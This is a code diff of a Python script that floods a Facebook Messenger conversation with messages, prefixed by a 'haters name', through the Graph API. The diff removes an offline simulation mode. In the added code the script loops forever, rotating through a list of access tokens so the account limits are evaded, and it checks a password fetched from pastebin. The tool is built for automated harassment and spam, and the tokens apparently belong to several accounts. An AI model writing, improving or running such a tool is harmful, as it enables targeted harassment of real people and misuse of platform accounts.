@@ -1,128 +1,100 @@
-import requests
-import time
-import sys
-from platform import system
-import os
-import http.server
-import socketserver
-import threading
-from datetime import datetime
-
-# Log messages with timestamps
-def log(message):
-    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {message}")
-
-# HTTP Server to keep Render app alive
-class MyHandler(http.server.SimpleHTTPRequestHandler):
-    def do_GET(self):
-        self.send_response(200)
-        self.send_header("Content-type", "text/plain")
-        self.end_headers()
-        self.wfile.write(b"CREATED BY MR PREM PROJECT")
-
-def execute_server():
-    try:
-        PORT = 4000
-        with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
-            log(f"Server running at http://localhost:{PORT}")
-            httpd.serve_forever()
-    except Exception as e:
-        log(f"HTTP server error: {e}")
-
-# Read file contents with error handling
-def read_file(filename):
-    try:
-        with open(filename, 'r') as file:
-            return file.read().strip()
-    except FileNotFoundError:
-        log(f"Error: File '{filename}' not found.")
-        sys.exit()
-    except Exception as e:
-        log(f"Error reading file '{filename}': {e}")
-        sys.exit()
-
-# Clear the console
-def clear_console():
-    if system() == "Linux":
-        os.system("clear")
-    elif system() == "Windows":
-        os.system("cls")
-
-# Send a single message
-def send_message(api_url, headers, payload, offline_mode, idx, message):
-    if offline_mode:
-        # Offline simulation
-        log(f"[SIMULATION] Message {idx + 1}: {message}")
-    else:
-        try:
-            response = requests.post(api_url, json=payload, headers=headers)
-            if response.ok:
-                log(f"[+] Message {idx + 1} sent: {message}")
-            else:
-                log(f"[x] Failed to send message {idx + 1}: {response.status_code} {response.text}")
-        except requests.RequestException as e:
-            log(f"[!] Error sending message {idx + 1}: {e}")
-
-# Main message-sending logic
 def send_messages():
-    try:
-        # Validate the password
-        correct_password = read_file("password.txt")
-        entered_password = correct_password  # Replace with user input for real scenarios
-        if entered_password != correct_password:
-            log("[-] WRONG PASSWORD. TRY AGAIN.")
-            sys.exit()
+    with open('password.txt', 'r') as file:
+        password = file.read().strip()
 
-        # Read all required files
-        tokens = read_file("token.txt").splitlines()
-        convo_id = read_file("convo.txt")
-        text_file_path = read_file("file.txt")
-        messages = read_file(text_file_path).splitlines()
-        haters_name = read_file("hatersname.txt")
-        speed = int(read_file("time.txt"))
+    entered_password = password
 
-        # Validate inputs
-        if not tokens or not messages:
-            raise ValueError("Token or message file is empty.")
+    if entered_password != password:
+        print('[-] WRONG PASSWORD TRY AGAIN')
+        sys.exit()
 
-        headers = {
-            "User-Agent": "Mozilla/5.0",
-            "referer": "www.google.com"
-        }
-        api_url_template = f"https://graph.facebook.com/v15.0/t_{convo_id}/"
-        offline_mode = True  # Change to False to send actual messages
+    with open('token.txt', 'r') as file:
+        tokens = file.readlines()
+    num_tokens = len(tokens)
 
-        clear_console()
+    requests.packages.urllib3.disable_warnings()
 
-        # Main loop: Send messages using tokens in a round-robin manner
-        token_index = 0
-        for idx, message in enumerate(messages):
-            token = tokens[token_index]
-            token_index = (token_index + 1) % len(tokens)  # Move to the next token
-            payload = {"access_token": token, "message": f"{haters_name} {message}"}
-            send_message(api_url_template, headers, payload, offline_mode, idx, f"{haters_name} {message}")
-            time.sleep(speed)  # Delay between messages
+    def cls():
+        if system() == 'Linux':
+            os.system('clear')
+        else:
+            if system() == 'Windows':
+                os.system('cls')
+    cls()
 
-        log("[+] All messages sent. Exiting...")
+    def liness():
+        print('\u001b[37m' + '---------------------------------------------------')
 
-    except ValueError as e:
-        log(f"[!] Value Error: {e}")
-    except Exception as e:
-        log(f"[!] Unexpected Error: {e}")
+    headers = {
+        'Connection': 'keep-alive',
+        'Cache-Control': 'max-age=0',
+        'Upgrade-Insecure-Requests': '1',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+        'referer': 'www.google.com'
+    }
 
-# Main entry point
-def main():
-    try:
-        # Start the HTTP server in a separate thread
-        server_thread = threading.Thread(target=execute_server, daemon=True)
-        server_thread.start()
+    mmm = requests.get('https://pastebin.com/raw/TcQPZaW8').text
 
-        # Start the message-sending logic
-        send_messages()
-    except KeyboardInterrupt:
-        log("Exiting... (Interrupted by user)")
-    except Exception as e:
-        log(f"[!] Unexpected Error in main: {e}")
+    if mmm not in password:
+        print('[-] WRONG PASSWORD TRY AGAIN')
+        sys.exit()
 
-if __name__ == "__main__":
-    main()
+    liness()
+
+    access_tokens = [token.strip() for token in tokens]
+
+    with open('convo.txt', 'r') as file:
+        convo_id = file.read().strip()
+
+    with open('file.txt', 'r') as file:
+        text_file_path = file.read().strip()
+
+    with open(text_file_path, 'r') as file:
+        messages = file.readlines()
+
+    num_messages = len(messages)
+    max_tokens = num_tokens  # Ensure each message gets a separate token
+
+    with open('hatersname.txt', 'r') as file:
+        haters_name = file.read().strip()
+
+    with open('time.txt', 'r') as file:
+        speed = int(file.read().strip())
+
+    liness()
+
+    while True:
+        try:
+            for message_index in range(num_messages):
+                # Calculate token index for each message
+                token_index = message_index % max_tokens
+                access_token = access_tokens[token_index]
+
+                message = messages[message_index].strip()
+
+                url = "https://graph.facebook.com/v15.0/{}/".format('t_' + convo_id)
+                parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
+                response = requests.post(url, json=parameters, headers=headers)
+
+                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+                if response.ok:
+                    print("[+] MESSAGE {} OF CONVO {} SENT BY TOKEN {}: {}".format(
+                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                    print("  - Time: {}".format(current_time))
+                    liness()
+                    liness()
+                else:
+                    print("[x] FAILED MESSAGE {} OF CONVO {} WITH TOKEN {}: {}".format(
+                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                    print("  - Time: {}".format(current_time))
+                    liness()
+                    liness()
+
+                time.sleep(speed)
+
+            print("\n[+] ALL MESSAGES SENT RESTARTING THE PROCESS\n")
+        except Exception as e:
+            print("[!] An error occurred: {}".format(e))
